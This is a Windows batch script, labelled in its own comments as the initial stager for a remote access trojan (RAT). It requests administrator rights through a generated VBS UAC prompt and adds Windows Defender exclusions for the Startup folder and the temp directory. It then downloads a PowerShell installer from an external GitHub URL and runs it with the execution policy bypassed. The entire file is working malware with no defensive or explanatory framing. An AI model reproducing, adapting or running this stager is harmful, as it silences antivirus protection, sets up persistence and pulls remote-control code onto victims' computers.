@REM @echo off
@REM initial stager for RAT

REM get admin permissions for script
@echo off

:: BatchGotAdmin
:-------------------------------------
REM  --> Check for permissions
    IF "%PROCESSOR_ARCHITECTURE%" EQU "amd64" (
>nul 2>&1 "%SYSTEMROOT%\SysWOW64\cacls.exe" "%SYSTEMROOT%\SysWOW64\config\system"
) ELSE (
>nul 2>&1 "%SYSTEMROOT%\system32\cacls.exe" "%SYSTEMROOT%\system32\config\system"
)

REM --> If error flag set, we do not have admin.
if '%errorlevel%' NEQ '0' (
    echo Requesting administrative privileges...
    goto UACPrompt
) else ( goto gotAdmin )

:UACPrompt
    echo Set UAC = CreateObject^("Shell.Application"^) > "%temp%\getadmin.vbs"
    set params= %*
    echo UAC.ShellExecute "cmd.exe", "/c ""%~s0"" %params:"=""%", "", "runas", 1 >> "%temp%\getadmin.vbs"

    "%temp%\getadmin.vbs"
    del "%temp%\getadmin.vbs"
    exit /B

:gotAdmin
    pushd "%CD%"
    CD /D "%~dp0"
:--------------------------------------    


@REM variables
set "INITIALPATH=%cd%"
set "STARTUP=C:/Users/%username%/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup"

@REM move into startup directory 
cd %STARTUP%

REM Disable Windows Defender
powershell -command "Add-MpPreference -ExclusionPath 'C:\Users\%username%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup'"
powershell -command "Add-MpPreference -ExclusionPath '$env:temp'"

REM Download and run PowerShell script
powershell -command "Invoke-WebRequest -Uri https://raw.githubusercontent.com/riahifiras/RAT/main/files/installer.ps1 -OutFile installer.ps1"
powershell -ep bypass -File .\installer.ps1

@REM cd back into initial location
cd "%INITIALPATH%"
@REM del initial.cmd
